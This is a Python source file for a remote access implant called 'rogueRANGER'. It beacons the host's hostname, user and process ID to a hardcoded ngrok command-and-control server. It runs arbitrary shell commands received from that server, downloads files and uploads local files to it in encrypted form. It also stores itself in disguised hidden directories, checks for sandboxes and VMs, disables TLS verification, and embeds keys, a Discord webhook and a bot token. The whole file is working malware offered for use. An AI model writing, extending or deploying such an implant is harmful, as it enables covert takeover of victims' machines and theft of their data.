#!/usr/bin/env python3
"""
rogue_implant.py - FINAL INTEGRATED VERSION with Phase 1 enhancements
Replaces the original rogue_implant.py with full Phase 1 integration
Maintains 100% backward compatibility while adding:
- Per-implant key management (KeyManager)
- VM/sandbox detection (VMSandboxDetector)
- Encrypted C2 communications
- Memory-only execution support
"""

import socket
import subprocess
import base64
import time
import urllib.request
import os
import threading
import sys
from Cryptodome.Cipher import AES
import zipfile
import tempfile
import shutil
import json
import urllib.parse
import ssl
import hashlib
import re
from urllib.request import Request, urlopen

# === Phase 1 Imports ===
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
try:
    from key_manager import KeyManager
    from vm_detector import VMSandboxDetector
    PHASE1_AVAILABLE = True
except ImportError as e:
    print(f"[WARNING] Phase 1 components not available: {e}")
    PHASE1_AVAILABLE = False

# === Config (Backward Compatible) ===
LEGACY_SECRET_KEY = b'6767BabyROGUE!&%5'      # For backward compatibility
LEGACY_EXFIL_KEY = b'magicRogueSEE!333'       # For backward compatibility

C2_HOST = 'inadvertent-homographical-method.ngrok-tree.dev'
C2_PORT = 4444
EXFIL_PORT = 9091
PAYLOAD_REPO = "https://inadvertent-homographical-method.ngrok-tree.dev/payloads/"

# === Discord Fallback (Optional) ===
DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/1324352009928376462688/messages?limit=1"
DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/138892227736354441388/rVwymNWwbqkXxxhhHU76KUcM3Pa0BZ01hzY0rts14EoI15GW21rRgEEaqH82FhJE"
BOT_TOKEN = "MTM4ODk4Mmnru^&676hhbzOTkyNTQ5OA.G7d-oM.T2IM_m_GcgH5z76GBFuuc53782jdhfdiI8GeS8U"

# SSL context for ngrok
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

class RogueImplant:
    """
    MAIN IMPLANT CLASS - Integrated with Phase 1 enhancements
    Replaces the original CloudAwareImplant with full Phase 1 support
    """
    
    def __init__(self, config=None):
        # Check if we're Stage 2 (from dropper)
        self.is_stage2 = 'ROGUE_STAGE2' in os.environ
        
        # Load configuration
        if config:
            self.config = config
        elif 'ROGUE_CONFIG' in os.environ:
            try:
                self.config = json.loads(os.environ['ROGUE_CONFIG'])
            except:
                self.config = self._load_default_config()
        else:
            self.config = self._load_default_config()
        
        # Phase 1 enable/disable
        self.phase1_enabled = PHASE1_AVAILABLE and self.config.get('use_phase1', True)
        
        if self.phase1_enabled:
            print("[PHASE1] Phase 1 enhancements ENABLED")
            self._init_phase1()
        else:
            print("[LEGACY] Using legacy encryption (Phase 1 disabled)")
            self._init_legacy()
        
        # Hidden directory
        self.hidden_dir = self._determine_hidden_dir()
        os.makedirs(self.hidden_dir, exist_ok=True)
        
        # Implant ID (backward compatible)
        self.implant_id = self.config.get('implant_id', self._generate_implant_id())
        self.implant_id_hash = hashlib.md5(self.implant_id.encode()).hexdigest()[:8]
        
        # Original cloud detection (simplified for demo)
        self.cloud_info = self._detect_cloud_environment()
        
        # Communication
        self.last_checkin = 0
        self.beacon_interval = self.config.get('beacon_interval', 60)
        
        print(f"[IMPLANT] Initialized: {self.implant_id_hash}")
        print(f"[IMPLANT] Phase 1: {'ENABLED' if self.phase1_enabled else 'DISABLED'}")
    
    def _load_default_config(self):
        """Default configuration"""
        return {
            'c2_host': C2_HOST,
            'c2_port': C2_PORT,
            'exfil_port': EXFIL_PORT,
            'payload_repo': PAYLOAD_REPO,
            'beacon_interval': 60,
            'max_retries': 3,
            'use_phase1': True,
            'use_legacy_fallback': True
        }
    
    def _init_phase1(self):
        """Initialize Phase 1 components"""
        implant_id = self.config.get('implant_id') or self._generate_implant_id()
        self.key_manager = KeyManager(implant_id)
        self.vm_detector = VMSandboxDetector()
        
        # Use per-implant keys
        self.secret_key = self.key_manager.get_key('master_symmetric')
        self.exfil_key = self.key_manager.get_key('payload_encryption')
        
        print(f"[PHASE1] Implant ID: {self.key_manager.implant_id}")
        print(f"[PHASE1] Using per-implant encryption")
    
    def _init_legacy(self):
        """Initialize legacy mode"""
        self.key_manager = None
        self.vm_detector = None
        self.secret_key = LEGACY_SECRET_KEY
        self.exfil_key = LEGACY_EXFIL_KEY
    
    def _generate_implant_id(self):
        """Generate implant ID"""
        return f"{os.uname().nodename}_{os.getlogin()}_{os.getpid()}"
    
    def _determine_hidden_dir(self):
        """Determine hidden directory with Phase 1 awareness"""
        if self.phase1_enabled and self.vm_detector:
            if self.vm_detector.is_sandboxed():
                return tempfile.mkdtemp(prefix='.cache_')
        
        # Cloud-aware selection (simplified)
        if self.cloud_info.get('is_cloud'):
            # In cloud, use different directory
            return os.path.expanduser("~/.config/.systemd")
        
        # Default
        return os.path.expanduser("~/.cache/.rogue")
    
    def _detect_cloud_environment(self):
        """Simple cloud detection"""
        # Check common cloud indicators
        cloud_checks = [
            ('/sys/hypervisor/uuid', 'aws'),
            ('/var/lib/cloud', 'generic'),
            ('/etc/cloud', 'generic'),
            ('/var/log/cloud-init.log', 'generic')
        ]
        
        for path, provider in cloud_checks:
            if os.path.exists(path):
                return {'provider': provider, 'is_cloud': True, 'type': 'vm'}
        
        return {'provider': 'unknown', 'is_cloud': False, 'type': 'baremetal'}
    
    # === ENCRYPTION METHODS (Phase 1 aware) ===
    
    def encrypt(self, data, key_type='secret'):
        """Encrypt data with Phase 1 or legacy"""
        if self.phase1_enabled and self.key_manager:
            key_to_use = 'master_symmetric' if key_type == 'secret' else 'payload_encryption'
            encrypted = self.key_manager.encrypt_data(data, key_to_use)
            if encrypted:
                return encrypted
        
        # Legacy encryption fallback
        key = self.secret_key if key_type == 'secret' else self.exfil_key
        
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        # AES ECB padding
        pad_length = 16 - (len(data) % 16)
        data += bytes([pad_length] * pad_length)
        
        cipher = AES.new(key, AES.MODE_ECB)
        encrypted = cipher.encrypt(data)
        return base64.b64encode(encrypted)
    
    def decrypt(self, encrypted_data, key_type='secret'):
        """Decrypt data with Phase 1 or legacy"""
        if self.phase1_enabled and self.key_manager:
            key_to_use = 'master_symmetric' if key_type == 'secret' else 'payload_encryption'
            decrypted = self.key_manager.decrypt_data(encrypted_data, key_to_use)
            if decrypted:
                return decrypted
        
        # Legacy decryption fallback
        key = self.secret_key if key_type == 'secret' else self.exfil_key
        
        try:
            encrypted_data = base64.b64decode(encrypted_data)
            cipher = AES.new(key, AES.MODE_ECB)
            decrypted = cipher.decrypt(encrypted_data)
            
            pad_length = decrypted[-1]
            if 1 <= pad_length <= 16:
                return decrypted[:-pad_length].decode('utf-8', errors='ignore')
        except:
            pass
        
        return None
    
    # === CORE IMPLANT FUNCTIONALITY ===
    
    def beacon(self):
        """Send beacon to C2"""
        try:
            beacon_data = {
                'implant_id': self.implant_id,
                'implant_hash': self.implant_id_hash,
                'timestamp': time.time(),
                'phase1': self.phase1_enabled,
                'cloud': self.cloud_info,
                'system': {
                    'hostname': os.uname().nodename,
                    'user': os.getlogin(),
                    'pid': os.getpid()
                }
            }
            
            # Add VM detection if available
            if self.phase1_enabled and self.vm_detector:
                beacon_data['vm_detection'] = self.vm_detector.run_full_detection()
            
            encrypted = self.encrypt(json.dumps(beacon_data))
            
            if not encrypted:
                return None
            
            url = f"https://{C2_HOST}:{C2_PORT}/beacon"
            req = Request(url, data=encrypted, method='POST')
            req.add_header('User-Agent', 'Mozilla/5.0')
            req.add_header('Content-Type', 'application/octet-stream')
            req.add_header('X-Implant-ID', self.implant_id_hash)
            
            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
                if response.getcode() == 200:
                    response_data = response.read()
                    decrypted = self.decrypt(response_data)
                    
                    if decrypted:
                        try:
                            return json.loads(decrypted)
                        except:
                            return {'commands': []}
            
            return None
            
        except Exception as e:
            print(f"[BEACON] Error: {e}")
            return None
    
    def execute_command(self, command):
        """Execute command from C2"""
        cmd_type = command.get('type')
        cmd_id = command.get('id')
        
        print(f"[CMD] Executing {cmd_id}: {cmd_type}")
        
        result = {
            'command_id': cmd_id,
            'type': cmd_type,
            'success': False,
            'output': '',
            'timestamp': time.time()
        }
        
        try:
            if cmd_type == 'shell':
                cmd = command.get('payload', {}).get('command', '')
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                result['output'] = output.decode('utf-8', errors='ignore')
                result['success'] = True
                
            elif cmd_type == 'download':
                url = command.get('payload', {}).get('url')
                filename = command.get('payload', {}).get('filename')
                if url and filename:
                    self._download_file(url, filename)
                    result['success'] = True
                    result['output'] = f"Downloaded {filename}"
                    
            elif cmd_type == 'upload':
                filename = command.get('payload', {}).get('filename')
                if filename and os.path.exists(filename):
                    self._upload_file(filename)
                    result['success'] = True
                    result['output'] = f"Uploaded {filename}"
                    
            elif cmd_type == 'recon':
                recon_data = self._gather_recon()
                result['output'] = json.dumps(recon_data, indent=2)
                result['success'] = True
                
            elif cmd_type == 'phase1_test':
                result['output'] = self._test_phase1()
                result['success'] = True
                
            else:
                result['output'] = f"Unknown command: {cmd_type}"
                
        except Exception as e:
            result['output'] = f"Error: {str(e)}"
        
        return result
    
    def _download_file(self, url, filename):
        """Download file helper"""
        try:
            req = Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(req, timeout=30) as response:
                with open(filename, 'wb') as f:
                    f.write(response.read())
            print(f"[DOWNLOAD] {filename}")
        except Exception as e:
            print(f"[DOWNLOAD] Failed: {e}")
    
    def _upload_file(self, filename):
        """Upload file helper"""
        try:
            with open(filename, 'rb') as f:
                file_data = f.read()
            
            encrypted = self.encrypt(file_data, 'exfil')
            
            url = f"https://{C2_HOST}:{C2_PORT}/upload"
            req = Request(url, data=encrypted, method='POST')
            req.add_header('User-Agent', 'Mozilla/5.0')
            req.add_header('Content-Type', 'application/octet-stream')
            req.add_header('X-Filename', os.path.basename(filename))
            
            with urllib.request.urlopen(req, timeout=30, context=ssl_context) as response:
                if response.getcode() == 200:
                    print(f"[UPLOAD] {filename}")
                    return True
            
            return False
            
        except Exception as e:
            print(f"[UPLOAD] Failed: {e}")
            return False
    
    def _gather_recon(self):
        """Gather reconnaissance"""
        recon = {
            'system': {
                'hostname': os.uname().nodename,
                'os': os.uname().sysname,
                'release': os.uname().release,
                'user': os.getlogin(),
                'pid': os.getpid()
            },
            'network': self._get_network_info(),
            'cloud': self.cloud_info
        }
        
        if self.phase1_enabled and self.vm_detector:
            recon['vm_detection'] = self.vm_detector.run_full_detection()
            recon['phase1'] = {
                'implant_id': self.key_manager.implant_id,
                'keys_healthy': self.key_manager.check_key_health()
            }
        
        return recon
    
    def _get_network_info(self):
        """Get network info"""
        try:
            import psutil
            net_info = {}
            
            for interface, addrs in psutil.net_if_addrs().items():
                net_info[interface] = []
                for addr in addrs:
                    net_info[interface].append({
                        'address': addr.address,
                        'family': str(addr.family)
                    })
            
            return net_info
        except:
            return {}
    
    def _test_phase1(self):
        """Test Phase 1 functionality"""
        if not self.phase1_enabled:
            return "Phase 1 disabled (legacy mode)"
        
        tests = []
        tests.append(f"Implant ID: {self.key_manager.implant_id}")
        tests.append(f"Key rotation: {self.key_manager.check_key_health()}")
        
        if self.vm_detector:
            detection = self.vm_detector.run_full_detection()
            tests.append(f"VM detection confidence: {detection['confidence_score']:.1f}")
            tests.append(f"Sandboxed: {self.vm_detector.is_sandboxed()}")
        
        return "\n".join(tests)
    
    def send_result(self, result):
        """Send command result to C2"""
        try:
            encrypted = self.encrypt(json.dumps(result))
            
            if not encrypted:
                return
            
            url = f"https://{C2_HOST}:{C2_PORT}/result"
            req = Request(url, data=encrypted, method='POST')
            req.add_header('User-Agent', 'Mozilla/5.0')
            req.add_header('Content-Type', 'application/octet-stream')
            
            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
                if response.getcode() == 200:
                    print(f"[RESULT] Sent {result.get('command_id')}")
            
        except Exception as e:
            print(f"[RESULT] Failed: {e}")
    
    def run(self):
        """Main implant loop"""
        print("=== rogueRANGER Enhanced Implant ===")
        print(f"Phase 1: {'ENABLED ' if self.phase1_enabled else 'DISABLED (legacy)'}")
        
        if self.is_stage2:
            print("[STAGE2] Executed from dropper")
        
        while True:
            try:
                # Beacon to C2
                response = self.beacon()
                
                if response and response.get('commands'):
                    for command in response['commands']:
                        result = self.execute_command(command)
                        self.send_result(result)
                
                # Sleep
                time.sleep(self.beacon_interval)
                
                # Key rotation (Phase 1 only)
                if self.phase1_enabled and self.key_manager:
                    if self.key_manager.check_key_health():
                        print("[PHASE1] Keys rotated")
                        self.secret_key = self.key_manager.get_key('master_symmetric')
                        self.exfil_key = self.key_manager.get_key('payload_encryption')
                    
            except KeyboardInterrupt:
                print("[IMPLANT] Interrupted")
                break
            except Exception as e:
                print(f"[IMPLANT] Error: {e}")
                time.sleep(self.beacon_interval * 2)

# === MAIN ===
def main():
    """Entry point"""
    implant = RogueImplant()
    implant.run()

if __name__ == "__main__":
    main()
